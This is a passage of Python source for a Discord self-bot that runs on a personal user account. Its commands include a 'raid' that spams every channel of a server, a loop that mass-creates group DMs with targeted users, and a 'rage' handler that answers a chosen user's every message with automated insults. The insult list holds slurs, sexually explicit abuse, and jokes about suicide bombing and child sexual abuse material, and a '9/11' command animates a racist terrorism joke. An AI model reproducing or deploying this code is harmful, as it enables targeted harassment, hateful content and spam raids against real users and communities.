        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
    async def guildicon(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        if not ctx.guild.icon.url:
            await ctx.send(f"**{ctx.guild.name}** has no icon")
            return
        await ctx.send(ctx.guild.icon.url)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command()
    async def purge(ctx, amount: int = None):
        await ctx.message.add_reaction('✅')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        await ctx.message.delete()
        if amount is None:
            await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}purge <amount>')
            return
        deleted_messages = 0
        async for message in ctx.message.channel.history(limit=amount):
            if message.author == bot.user:
                try:
                    await message.delete()
                    deleted_messages += 1
                except Exception as e:
                    print(f"Failed to delete message: {e}")



    @bot.command(aliases=["9/11", "911", "terrorist"])
    async def nine_eleven(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        invis = ""  # char(173)
        message = await ctx.send(f'''
    {invis}:man_wearing_turban::airplane:       :office:           
    ''')
        await asyncio.sleep(0.5)
        await message.edit(content=f'''
    {invis} :man_wearing_turban: :airplane:     :office:           
    ''')
        await asyncio.sleep(0.5)
        await message.edit(content=f'''
    {invis}  :man_wearing_turban:  :airplane:   :office:           
    ''')
        await asyncio.sleep(0.5)
        await message.edit(content=f'''
    {invis}   :man_wearing_turban:   :airplane::office:           
    ''')
        await asyncio.sleep(0.5)
        await asyncio.sleep(0.5)
        await message.edit(content='''
            :boom::boom::boom:    
            ''')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command()
    async def fuck(ctx, user_id: int):
        user = await bot.fetch_user(user_id)
        await ctx.message.add_reaction('✅')

        
        ascii_art = f'''```


        
            {ctx.message.author.name}

                /  _/\\
                | / oo    
                \\(   _\\
                \\  O/     
                /   \\    {user.name}
                ||  ||
                ||  ||      "Hmmmmmmmm..."
                ||  || _____ /
                | \\ ||(___  )
                // / \\|_)o (  )
                \\\\ ///|)\\_(    )
                ||   |\\ )(    )
                ||   ) \\/(____)_     ___
                ||   |\\___/     `---' `.`.
                ||   | :   _       .'   ))
                ||   | `..' `~~~-.'   .'__ _
                \\\\  /           '.______  ( (
                ((___ooO                `._\\_\\ jro
    ```'''
        
        
        await ctx.send(ascii_art)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command(aliases=['halag', 'toxic'])
    async def rage(ctx, user_id: int):
        await ctx.message.add_reaction('✅')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        try:
            user = await bot.fetch_user(user_id)
        except discord.NotFound:
            await ctx.send(f"User with ID {user_id} not found.")
            return
        randomnumber = random.randint(1,100000)
    
        random_sentences = [
            "sorry but I never understand what you are actually trying to say",
            "your confidence to show up even with such disrespect is impressive",
            "lmao this dude lives in his moms basement",
            "keep yapping",
            "cry harder ong",
            "L",
            "skill issue mf",
            "your mom",
            "proves my point that you're retarded",
            "the misinformation here is crazyy",
            "100000 blocked messages",
            f"As he couldnt hold it anymore, he began ejaculating fully into {user.name}'s mouth making him swallow every bit of sweet n sour jizz coming out of his monster, FUCK..! he shouted as this was one of the best fucks ever..",
            "Your family decided to become suicide bombers to get away from you",
            "You are the definition of brain rot",
            "You shop on TikTok shop",
            "I bet you buy your food of Temu",
            "When you think youre alone and everyone hates you, remember. We do all hate you",
            "is retarded",
            "You probably bought Twitter for $44 Billion instead of buying it off the App Store",
            "I bet you call people brokies then go cry to your anime pillows about how hard your day was",
            "You probably ate the purple pill.",
            "Being an idiot is a choice, for you it was your only option.",
            f"I only sent {randomnumber} C(heese) P(izza)"
            
        ]
        
        @bot.event
        async def on_message(message):
            if message.author.id == user.id:
                response = random.choice(random_sentences) 
                #await asyncio.sleep(.5) #the delay here is optional comment it out if u want
                await message.channel.send(f'{user.mention} {response}')
                print(f'{bot.user.name} said "{response}" against @{user.name}')
        await ctx.send(f"{user.mention} lmaoo skill issue fr")
    

    @bot.command()
    async def clear(ctx):
        await ctx.message.add_reaction('✅')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        time.sleep(0.5)
        await ctx.message.delete()
        print('CLEARING TERMINAL...')
        time.sleep(1)
        if osname == "Linux":
            os.system('clear')
        elif osname == "Windows":
            os.system('cls')
        text = '''


            ▄▄▌  ▪  ▄▄▄▄▄▄▄▄▄▄▄▄▌  ▄▄▄ .    ·▄▄▄▄  ▄▄▄ . ▌ ▐·▪  ▄▄▌  
            ██•  ██ •██  •██  ██•  ▀▄.▀·    ██▪ ██ ▀▄.▀·▪█·█▌██ ██•  
            ██▪  ▐█· ▐█.▪ ▐█.▪██▪  ▐▀▀▪▄    ▐█· ▐█▌▐▀▀▪▄▐█▐█•▐█·██▪  
            ▐█▌▐▌▐█▌ ▐█▌· ▐█▌·▐█▌▐▌▐█▄▄▌    ██. ██ ▐█▄▄▌ ███ ▐█▌▐█▌▐▌
            .▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀ .▀▀▀  ▀▀▀     ▀▀▀▀▀•  ▀▀▀ . ▀  ▀▀▀.▀▀▀         


    '''

        #print(pystyle.Colorate.Vertical(pystyle.Colors.yellow_to_red, text, 1))
        colortext = pystyle.Colorate.Vertical(pystyle.Colors.purple_to_blue, pystyle.Center.XCenter(text), 1)
        print(colortext)
        time.sleep(1)
        boxtext = f"[+] Logged in as: {bot.user.name}\n[+] UserID: {bot.user.id}\n[+] Version: 2.5\n[+] Prefix: {PREFIX}\nDesign is inspired from PWNSEC\nWebsite: PWNSEC.net\nStartup command: >help\n[+] MSGSNIPING: {config['MSGSNIPE']}"
        box = pystyle.Box.Lines(boxtext)
        centerbox = pystyle.Center.XCenter(pystyle.Colorate.Vertical(pystyle.Colors.purple_to_blue, box, 1))
        print(centerbox)


    @bot.command()
    async def gc(ctx, max: int, numoftimes: int, *user_ids: int): 
        users = []
        numoftimes = 0
        
        await ctx.message.add_reaction('✅')
        time.sleep(0.3)
        await ctx.message.delete()
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        for user_id in user_ids:
            try:
                user = bot.get_user(user_id)
                if not user:
                    user = await bot.fetch_user(user_id)
                users.append(user)
            except discord.NotFound:
                await ctx.send(f'User with ID {user_id} not found.')
                return
            except discord.HTTPException as e:
                await ctx.send(f'Error fetching user {user_id}: {e}')
                return

        if len(users) < 2:
            await ctx.send('You need at least 2 users to create a group DM.')
            return

        try:
           
            while True:
                group_dm = await bot.create_group(*users)
                numoftimes = numoftimes + 1
                if numoftimes == max:
                    break
            #await group_dm.send('Group DM created!')
            #await ctx.send('Group DM successfully created.')
        except Exception as e:
            await ctx.send(f'```Error creating group DM: {e}```')


    @bot.command()
    async def raid(ctx, message: str, count: int, delay: float, channel: commands.TextChannelConverter=None):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete() 
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        guild = ctx.guild
        channels_to_spam = guild.text_channels
        
        if channel: 
            channels_to_spam = [channel]

        async def spam_in_channel(channel):
            try:
                messages_sent = 0
                while messages_sent < count:
                    await channel.send(message)
                    messages_sent += 1
                    await asyncio.sleep(delay)
            except Forbidden:
                print(f"Missing permissions to send messages in #{channel.name}. Skipping.")
            except Exception as e:
                print(f"Error while spamming in #{channel.name}: {e}")

        
        spam_tasks = [spam_in_channel(channel) for channel in channels_to_spam]
        await asyncio.gather(*spam_tasks)

        
        os.system('cls' if os.name == 'nt' else 'clear')
        text = '''


            ▄▄▌  ▪  ▄▄▄▄▄▄▄▄▄▄▄▄▌  ▄▄▄ .    ·▄▄▄▄  ▄▄▄ . ▌ ▐·▪  ▄▄▌  
            ██•  ██ •██  •██  ██•  ▀▄.▀·    ██▪ ██ ▀▄.▀·▪█·█▌██ ██•  
            ██▪  ▐█· ▐█.▪ ▐█.▪██▪  ▐▀▀▪▄    ▐█· ▐█▌▐▀▀▪▄▐█▐█•▐█·██▪  
            ▐█▌▐▌▐█▌ ▐█▌· ▐█▌·▐█▌▐▌▐█▄▄▌    ██. ██ ▐█▄▄▌ ███ ▐█▌▐█▌▐▌
            .▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀ .▀▀▀  ▀▀▀     ▀▀▀▀▀•  ▀▀▀ . ▀  ▀▀▀.▀▀▀         


    '''

        #print(pystyle.Colorate.Vertical(pystyle.Colors.yellow_to_red, text, 1))
        colortext = pystyle.Colorate.Vertical(pystyle.Colors.purple_to_blue, pystyle.Center.XCenter(text), 1)
        print(colortext)
        time.sleep(1)
        boxtext = f"[+] Logged in as: {bot.user.name}\n[+] UserID: {bot.user.id}\n[+] Version: 2.5\n[+] Prefix: {PREFIX}\nDesign is inspired from PWNSEC\nWebsite: PWNSEC.net\nStartup command: >help\n[+] MSGSNIPING: {config['MSGSNIPE']}"
        box = pystyle.Box.Lines(boxtext)
        centerbox = pystyle.Center.XCenter(pystyle.Colorate.Vertical(pystyle.Colors.purple_to_blue, box, 1))
        print(centerbox)

    bot.run(TOKEN)

except TypeError as e:
    print(f'{red}there was an error: {e}...\nIn order to fix it please uninstall and re install discord.py-self{reset}')
    typerrorhandle= input(f'{cyan}Would you like to do that? Y/N: {reset}')
    if typerrorhandle == "y" or typerrorhandle == "Y":
        os.system("pip uninstall discord.py-self")
        os.system("pip install discord.py-self")
        kek123 = input(f'{cyan} To fully ensure the code runs safely, would you like to upgrade your libraries? Y/N: {reset}')
        if kek123 == "Y" or kek123 == "y":
            os.system("pip install --upgrade discord.py-self aiohttp")
            if osname == "Linux":
                os.system('cowsay -f tux.cow "Yayyy we may have fixed the error" | lolcat')
        elif kek123 == "N" or kek123 == "n":
            print("Your choice you can come back here!!")
            time.sleep(2)
            os.system("\npython main.py")
        else:
            print(f"{red}Not a valid choice!!1!{reset}")
    elif typerrorhandle == "n" or typerrorhandle == "N":
        print(f"{cyan}your choice.. you can always come back here btw{reset}")
    else:
        print(f"{red}INVALID INPUT{reset}")

except discord.errors.LoginFailure as f:
    print(f'{red}The token is either invalid or you left it empty...{reset}')

